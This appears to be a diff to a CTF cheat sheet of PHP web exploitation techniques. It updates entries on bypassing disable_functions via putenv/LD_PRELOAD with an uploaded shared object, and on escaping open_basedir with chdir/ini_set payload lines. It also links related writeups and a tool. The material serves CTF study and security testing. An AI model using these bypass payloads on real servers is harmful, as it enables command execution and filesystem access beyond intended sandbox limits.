@@ -159,7 +159,7 @@ https://github.com/p4-team/ctf/tree/master/2017-12-09-seccon-quals/web_automatic
 * bypass disable_functions by overwriting memory through the procfs - plaidctf-2014 nightmares
 http://www.reddit.com/r/netsec/comments/2tyh93/php_disable_functions_procfs_bypass_ru/
 
-* bypass disable_functions via putenv() LD_PRELOAD and mail(). Need to upload .so and .php (see 0ctf-2016 guestbook https://blog.ka0labs.net/post/33/ or alictf-2016 homework https://github.com/tothi/ctfs/tree/master/alictf-2016/homework)
+* bypass disable_functions via putenv() LD_PRELOAD and mail(). Need to upload .so and .php // see 0ctf-2016 guestbook https://blog.ka0labs.net/post/33/ or alictf-2016 homework https://github.com/tothi/ctfs/tree/master/alictf-2016/homework or https://github.com/TarlogicSecurity/Chankro
 upload a.so:
 # compile with gcc -c -fPIC a.c -o a.o && gcc a.o -shared -o a.so
 #include <stdlib.h>
@@ -197,7 +197,7 @@ upload blah.php:
 
 * bypass open_basedir()
 chdir(__DIR__."/blah");ini_set("open_basedir","..");chdir("..");chdir("..");chdir("..");chdir("..");chdir("..");var_dump(scandir("/")); // old
-chdir('/tmp');mkdir('sky');chdir('sky');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(ini_get('open_basedir'));var_dump(glob('*')); // https://skysec.top/2019/06/10/2019%200ctf%20final%20Web%20Writeup%EF%BC%881%EF%BC%89/
+mkdir('/var/www/html/<sandbox>/lol');chdir('/var/www/html/<sandbox>/lol');ini_set('open_basedir', '..');chdir('..');chdir('..');...;ini_set('open_basedir','/'); var_dump(glob('*')); // https://skysec.top/2019/06/10/2019%200ctf%20final%20Web%20Writeup%EF%BC%881%EF%BC%89/ https://twitter.com/eboda_/status/1113839230608797696
 
 * bypass __wakeup()
 https://bugs.php.net/bug.php?id=72663
